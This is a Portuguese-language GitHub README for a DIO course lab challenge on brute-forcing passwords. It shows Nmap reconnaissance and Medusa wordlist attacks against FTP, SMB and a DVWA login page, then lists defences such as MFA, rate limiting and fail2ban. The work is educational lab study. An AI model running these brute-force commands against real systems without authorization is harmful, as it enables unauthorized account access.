# Desafio DIO: Criando um Ataque Brute Force de Senhas com Medusa e Kali Linux

Repositório desenvolvido como entrega de desafio prático durante os meus estudos de Cibersegurança com bolsa da **DIO (Digital Innovation One)**. O objetivo é documentar o processo técnico de auditoria de senhas e testes de força bruta em ambiente controlado utilizando **Kali Linux**, **Nmap** e **Medusa**[cite: 1, 2].

> **Aviso Legal:** Todo o conteúdo deste repositório tem fins exclusivamente educacionais e de aprendizado em segurança da informação. Todos os testes foram realizados em ambiente isolado de laboratório (máquinas virtuais locais e aplicações propositalmente vulneráveis, como o DVWA)[cite: 1, 2].

---

## Objetivos de Aprendizagem
- Compreender o funcionamento de ataques de força bruta em diferentes serviços (**FTP**, **Web** e **SMB**).
- Utilizar o **Kali Linux** e o **Medusa** para auditoria de segurança em ambiente controlado.
- Documentar processos técnicos e evidências de forma clara e estruturada no GitHub.
- Reconhecer vulnerabilidades de autenticação e propor medidas de mitigação[cite: 1].

## Ferramentas e Ambiente Utilizados
- **Sistema Operacional:** Kali Linux (Máquina Virtual)[cite: 1, 2]
- **Reconhecimento de Serviços:** Nmap
- **Auditoria / Força Bruta:** Medusa[cite: 1, 2]
- **Alvos de Laboratório:** Serviços FTP, SMB e aplicação web **DVWA (Damn Vulnerable Web Application)**[cite: 1, 2]

---

## Passo a Passo Técnico (Ambiente de Laboratório)

> **Nota:** Substitua `<IP_DO_ALVO>` pelo endereço IP da máquina virtual alvo do laboratório.

### 1. Reconhecimento com Nmap
Antes de testar credenciais, identificamos quais portas e serviços estão ativos no alvo:
```bash
nmap -sV <IP_DO_ALVO>

medusa -h <IP_DO_ALVO> -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4 -f

medusa -h <IP_DO_ALVO> -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -t 4 -f

medusa -h <IP_DO_ALVO> -U wordlists/usuarios.txt -P wordlists/senhas.txt -M http -m DIR:/dvwa/login.php -t 4 -f

Principais Flags do Medusa
-h: endereço IP ou host do alvo.

-u / -U: usuário único ou arquivo (wordlist) de usuários.

-p / -P: senha única ou arquivo (wordlist) de senhas.

-M: módulo/protocolo do serviço testado (ftp, smbnt, http, ssh, etc.)[cite: 1].

-t: número de threads (conexões simultâneas).

-f: interrompe a execução ao encontrar a primeira credencial válida.


Medidas de Mitigação e Defesa
Autenticação Multifator (MFA): impede o acesso mesmo que a senha seja descoberta.

Políticas de Senhas Fortes: exigir senhas longas, complexas e evitar credenciais padrão.

Bloqueio de Tentativas e Rate Limiting: configurar ferramentas como fail2ban ou bloqueio temporário de conta após falhas consecutivas.

Proteção contra Captcha e Tokens CSRF: implementar mecanismos anti-automação em formulários de login web.

Segmentação e Restrição de Acesso: limitar exposição de serviços como FTP e SMB apenas às redes estritamente necessárias.


Referências e DocumentaçõesDIO (Digital Innovation One) — Desafio: Criando um Ataque Brute Force de senhas com Medusa e Kali Linux   Kali Linux – Site Oficial   DVWA – Damn Vulnerable Web Application   Medusa – Documentação Oficial
